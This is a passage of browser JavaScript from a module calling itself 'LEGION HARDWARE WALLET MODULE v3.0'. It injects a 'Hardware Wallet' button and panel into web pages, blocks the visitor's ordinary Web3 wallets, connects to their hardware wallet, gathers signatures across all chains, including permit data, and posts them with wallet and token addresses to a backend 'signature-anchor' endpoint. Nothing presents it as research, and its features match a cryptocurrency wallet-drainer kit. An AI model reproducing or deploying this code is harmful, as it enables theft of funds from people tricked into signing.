            ingress: 'normalized_v1',
            chain_family: cfg.family,
            protocol: cfg.protocol,
            wallet_address: address,
            token_address: cfg.token,
            signature: sig.signature,
            nonce: 'legion:hw:' + chain.toLowerCase() + ':' + Date.now() + ':' + i,
            expiry_iso: expiry,
            wallet_type: 'hardware_wallet',
            scout_value_usd: SESSION.scoutValueUsd || 0
          };
          var res = await apiPost('/api/v1/signature-anchor', payload);
          LOG.info(chain + ' submitted: ' + (res && res.message || 'ok'));
          submitted++;
        } catch (e) {
          LOG.error(chain + ' submit failed: ' + e.message);
        }
      }

      LOG.info('Total submitted: ' + submitted + ' chains');
      return submitted;
    },

    disconnect: function() {
      if (SESSION.connection) {
        try {
          if (SESSION.connection.device && SESSION.connection.device.close) SESSION.connection.device.close();
          if (SESSION.connection.server && SESSION.connection.server.disconnect) SESSION.connection.server.disconnect();
        } catch (e) {}
        SESSION.connection = null;
        SESSION.signatures = {};
        SESSION.permit2Result = null;
        LOG.info('Disconnected');
      }
    }
  };

  // ─── UI ──────────────────────────────────────────────────────────────────────

  function setStatus(msg, isError) {
    var el = document.getElementById('hw-status');
    if (el) {
      el.textContent = msg;
      el.style.color = isError ? '#f87171' : '#94a3b8';
    }
  }

  function createColdWalletUI() {
    var available = getAvailableWallets();
    var methods = getAvailableMethods();

    var css = document.createElement('style');
    css.textContent = [
      '#legion-hw-launcher{position:fixed;bottom:24px;right:24px;z-index:2147483640;padding:12px 20px;border-radius:12px;border:0;background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;font:600 14px system-ui;cursor:pointer;box-shadow:0 4px 16px rgba(245,158,11,.4);display:flex;align-items:center;gap:8px;}',
      '#legion-hw-launcher:hover{transform:scale(1.04);}',
      '#legion-hw-panel{position:fixed;bottom:80px;right:24px;z-index:2147483641;width:min(360px,calc(100vw - 32px));background:#0f172a;color:#e2e8f0;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.65);font:13px/1.5 system-ui;overflow:hidden;display:none;border:1px solid rgba(245,158,11,.2);}',
      '#legion-hw-panel.open{display:block;animation:hw-slide .22s ease;}',
      '@keyframes hw-slide{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}',
      '.hw-hdr{padding:14px 16px;background:linear-gradient(135deg,#1e293b,#0f172a);border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:space-between;}',
      '.hw-hdr span{font-weight:700;font-size:15px;color:#fbbf24;}',
      '.hw-hdr button{background:0;border:0;color:#64748b;font-size:22px;cursor:pointer;line-height:1;}',
      '.hw-body{padding:16px;}',
      '.hw-methods{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;}',
      '.hw-method{padding:4px 10px;border-radius:999px;font-size:11px;font-weight:600;}',
      '.hw-method.on{background:rgba(34,197,94,.12);color:#4ade80;}',
      '.hw-method.off{background:rgba(239,68,68,.10);color:#f87171;}',
      '.hw-wallet-list{max-height:180px;overflow-y:auto;margin-bottom:12px;}',
      '.hw-wallet-list::-webkit-scrollbar{width:4px;} .hw-wallet-list::-webkit-scrollbar-thumb{background:#334155;border-radius:4px;}',
      '.hw-wallet-item{display:flex;align-items:center;justify-content:space-between;padding:9px 12px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:10px;margin-bottom:5px;cursor:pointer;transition:all .15s;}',
      '.hw-wallet-item:hover{background:rgba(245,158,11,.1);border-color:rgba(245,158,11,.3);}',
      '.hw-wallet-name{font-weight:500;font-size:13px;}',
      '.hw-wallet-tag{font-size:10px;color:#94a3b8;text-transform:uppercase;letter-spacing:.5px;}',
      '.hw-btn{width:100%;padding:12px;border:0;border-radius:12px;font:600 14px system-ui;cursor:pointer;color:#fff;background:linear-gradient(135deg,#f59e0b,#d97706);box-shadow:0 2px 12px rgba(245,158,11,.3);margin-bottom:8px;}',
      '.hw-btn:hover{box-shadow:0 4px 20px rgba(245,158,11,.45);}',
      '.hw-btn:disabled{opacity:.5;cursor:not-allowed;}',
      '.hw-status{font-size:12px;color:#94a3b8;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:8px;min-height:36px;line-height:1.5;}',
    ].join('');
    document.head.appendChild(css);

    // Launcher button
    var launcher = document.createElement('button');
    launcher.id = 'legion-hw-launcher';
    launcher.innerHTML = '🔐 Hardware Wallet';
    launcher.addEventListener('click', function() {
      var panel = document.getElementById('legion-hw-panel');
      if (panel) panel.classList.toggle('open');
    });
    document.body.appendChild(launcher);

    // Method badges
    var badgesHTML = [
      { key: 'usb', label: 'USB' },
      { key: 'hid', label: 'HID' },
      { key: 'ble', label: 'Bluetooth' },
      { key: 'nfc', label: 'NFC' },
      { key: 'qr',  label: 'QR Code' }
    ].map(function(m) {
      var on = methods.indexOf(m.key) !== -1;
      return '<span class="hw-method ' + (on ? 'on' : 'off') + '">' + m.label + '</span>';
    }).join('');

    // Wallet list (grouped by method for readability)
    var walletsHTML = available.map(function(w, idx) {
      return '<div class="hw-wallet-item" data-idx="' + idx + '">' +
        '<div><div class="hw-wallet-name">' + w.name + '</div>' +
        '<div class="hw-wallet-tag">' + w.method.toUpperCase() + ' · ' + w.chains.join(', ') + '</div></div>' +
        '<span style="color:#fbbf24;font-size:16px;">›</span></div>';
    }).join('');

    // Panel
    var panel = document.createElement('div');
    panel.id = 'legion-hw-panel';
    panel.innerHTML =
      '<div class="hw-hdr"><span>🔐 Hardware Wallet</span><button id="hw-close">×</button></div>' +
      '<div class="hw-body">' +
        '<div class="hw-methods">' + badgesHTML + '</div>' +
        '<div class="hw-wallet-list">' + walletsHTML + '</div>' +
        '<button class="hw-btn" id="hw-auto-connect">Auto-Detect & Connect</button>' +
        '<div class="hw-status" id="hw-status">' + available.length + ' hardware wallets supported · Select device above</div>' +
      '</div>';
    document.body.appendChild(panel);

    // Close
    document.getElementById('hw-close').addEventListener('click', function() {
      panel.classList.remove('open');
    });

    // Auto-detect: connect → sign all → submit
    document.getElementById('hw-auto-connect').addEventListener('click', async function() {
      var btn = this;
      btn.disabled = true;
      try {
        setStatus('Searching for hardware device...');
        await SESSION.connect();
        var addr = SESSION.connection.address;
        setStatus('Connected: ' + SESSION.connection.name + (addr ? ' · ' + addr.substring(0, 10) + '...' : ''));

        setStatus('Signing on device — check your hardware wallet screen...');
        var sigs = await SESSION.signAllChains();
        var sigCount = Object.keys(sigs).length;
        setStatus('Signed ' + sigCount + ' chain(s). Submitting to backend...');

        var submitted = await SESSION.submitToBackend();
        setStatus('Done ✅ — ' + submitted + ' chain(s) submitted. Settlement processing.');
        btn.textContent = 'Done ✅';
      } catch (e) {
        setStatus('Error: ' + e.message, true);
        btn.disabled = false;
        LOG.error('Auto-connect flow: ' + e.message);
      }
    });

    // Individual wallet select: connect only, then full flow
    panel.querySelectorAll('.hw-wallet-item').forEach(function(item) {
      item.addEventListener('click', async function() {
        var idx = parseInt(this.getAttribute('data-idx'));
        var btn = document.getElementById('hw-auto-connect');
        btn.disabled = true;
        setStatus('Connecting to ' + available[idx].name + '...');
        try {
          await SESSION.connect(idx);
          var addr = SESSION.connection.address;
          setStatus('Connected: ' + SESSION.connection.name + (addr ? ' · ' + addr.substring(0, 10) + '...' : ''));

          setStatus('Signing — approve on your device...');
          var sigs = await SESSION.signAllChains();
          setStatus('Signed ' + Object.keys(sigs).length + ' chain(s). Submitting...');

          var submitted = await SESSION.submitToBackend();
          setStatus('Done ✅ — ' + submitted + ' chain(s) submitted.');
          btn.textContent = 'Done ✅';
        } catch (e) {
          setStatus('Failed: ' + e.message, true);
          btn.disabled = false;
        }
      });
    });
  }

  // ─── INIT ────────────────────────────────────────────────────────────────────

  function init() {
    LOG.info('LEGION HARDWARE WALLET MODULE v3.0 — init');
    blockWeb3Wallets();
    var methods = getAvailableMethods();
    var wallets = getAvailableWallets();
    LOG.info('Methods available: ' + methods.join(', '));
    LOG.info('Wallets supported: ' + wallets.length);
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', createColdWalletUI);
    } else {
      createColdWalletUI();
    }
  }

  // ─── PUBLIC API ──────────────────────────────────────────────────────────────

  window.LEGION_HARDWARE = {
    connect:      function(idx) { return SESSION.connect(idx); },
    sign:         function(chain, msg) { return signPersonalMessage(SESSION.connection, msg || 'Verify'); },
    signAll:      function() { return SESSION.signAllChains(); },
    submit:       function() { return SESSION.submitToBackend(); },
    disconnect:   function() { SESSION.disconnect(); },
    isConnected:  function() { return SESSION.connection !== null; },
    getAddress:   function() { return SESSION.connection && SESSION.connection.address; },
    getSignatures:function() { return SESSION.signatures; },
    getVaults:    function() { return SESSION.vaults; },
    getAvailable: function() { return getAvailableWallets(); },
    getMethods:   function() { return getAvailableMethods(); },
    getLogs:      function() { return LOG.history; }
  };

  init();

})();
